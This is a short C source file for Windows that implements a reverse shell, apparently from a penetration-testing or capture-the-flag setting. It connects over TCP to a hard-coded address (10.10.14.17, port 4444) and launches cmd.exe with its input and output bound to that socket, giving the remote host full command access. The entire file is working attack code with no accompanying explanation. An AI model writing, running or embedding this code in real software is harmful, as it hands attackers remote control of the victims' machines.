#include <winsock2.h>
#include <windows.h>
#pragma comment(lib,"ws2_32")

WSADATA wsaData;
SOCKET s1;
struct sockaddr_in hax;
char ip_addr[] = "10.10.14.17";
char port[] = "4444";
STARTUPINFO sui;
PROCESS_INFORMATION pi;

int main(int argc, char **argv) {
    WSAStartup(MAKEWORD(2,2), &wsaData);
    s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
    
    hax.sin_family = AF_INET;
    hax.sin_port = htons(atoi(port));
    hax.sin_addr.s_addr = inet_addr(ip_addr);

    WSAConnect(s1, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
    
    memset(&sui, 0, sizeof(sui));
    sui.cb = sizeof(sui);
    sui.dwFlags = STARTF_USESTDHANDLES;
    sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE) s1;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
    return 0;
}
